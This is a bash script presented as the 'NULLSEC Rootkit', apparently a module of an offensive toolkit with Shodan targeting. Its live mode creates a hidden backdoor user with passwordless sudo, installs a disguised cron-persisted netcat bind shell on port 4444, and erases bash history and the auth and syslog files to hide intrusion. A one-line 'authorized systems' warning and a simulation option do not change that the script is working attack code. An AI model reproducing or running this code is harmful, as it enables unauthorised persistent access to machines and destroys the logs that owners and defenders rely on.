#!/bin/bash
# NULLSEC Rootkit - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC ROOTKIT ▓▓▓${RESET}"
echo ""

echo -e "  ${YELLOW}Action:${RESET}"
echo -e "    1) Install backdoor user"
echo -e "    2) Hide process"
echo -e "    3) Install persistence"
echo -e "    4) Clean traces"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ACTION
[ -z "$ACTION" ] && ACTION="1"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing rootkit"
    actions=("Installing backdoor" "Hiding process" "Installing persistence" "Cleaning traces")
    echo -e "${DIM}[*] ${actions[$((ACTION-1))]}...${RESET}"
    sleep 0.5
    echo -e "${GREEN}[+]${RESET} Complete - system compromised"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live rootkit deployment"
    echo -e "${RED}[!] WARNING: DANGEROUS - Only use on authorized systems${RESET}"
    
    case $ACTION in
        1)
            read -p "$(echo -e ${WHITE}'  [>] Backdoor username: '${RESET})" BUSER
            [ -z "$BUSER" ] && BUSER="backdoor"
            read -p "$(echo -e ${WHITE}'  [>] Password: '${RESET})" BPASS
            [ -z "$BPASS" ] && BPASS="toor"
            
            echo -e "${CYAN}[*] Creating backdoor user...${RESET}"
            sudo useradd -m -s /bin/bash -G sudo $BUSER 2>/dev/null
            echo "$BUSER:$BPASS" | sudo chpasswd
            
            # Hide from who/w commands
            sudo touch /etc/sudoers.d/$BUSER
            echo "$BUSER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/$BUSER > /dev/null
            echo -e "${GREEN}[+]${RESET} Backdoor user created: $BUSER"
            ;;
        2)
            read -p "$(echo -e ${WHITE}'  [>] Process name to hide: '${RESET})" PROC
            echo -e "${CYAN}[*] Hiding process: $PROC${RESET}"
            echo -e "${YELLOW}[*] Note: Requires kernel module or LD_PRELOAD hook${RESET}"
            ;;
        3)
            echo -e "${CYAN}[*] Installing persistence...${RESET}"
            PERSIST_SCRIPT="/tmp/.system_update"
            cat > $PERSIST_SCRIPT << 'PEOF'
#!/bin/bash
# Persistence backdoor
while true; do
    nc -l -p 4444 -e /bin/bash 2>/dev/null &
    sleep 3600
done
PEOF
            chmod +x $PERSIST_SCRIPT
            
            # Add to crontab
            (crontab -l 2>/dev/null; echo "@reboot $PERSIST_SCRIPT") | crontab -
            echo -e "${GREEN}[+]${RESET} Persistence installed"
            ;;
        4)
            echo -e "${CYAN}[*] Cleaning traces...${RESET}"
            # Clear bash history
            history -c
            echo "" > ~/.bash_history
            # Clear system logs
            sudo truncate -s 0 /var/log/auth.log 2>/dev/null
            sudo truncate -s 0 /var/log/syslog 2>/dev/null
            echo -e "${GREEN}[+]${RESET} Traces cleaned"
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
